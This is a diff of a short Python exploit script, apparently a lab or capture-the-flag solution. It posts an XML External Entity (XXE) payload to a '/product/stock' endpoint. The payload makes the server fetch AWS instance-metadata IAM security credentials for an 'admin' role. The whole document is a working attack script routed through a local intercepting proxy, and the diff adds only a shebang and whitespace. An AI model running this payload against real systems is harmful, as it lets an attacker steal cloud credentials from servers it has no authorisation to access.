@@ -1,13 +1,13 @@
+#!/usr/bin/env python3
+
 import requests
 import sys
 import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def exploit_xxe(s, url):
-
     print("(+) Exploiting XXE Injection...")
     stock_url = url + "/product/stock"
     data_stock = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'
@@ -24,6 +24,7 @@ def main():
     s = requests.Session()
     url = sys.argv[1]
     exploit_xxe(s, url)
+
 
 if __name__ == "__main__":
     main()
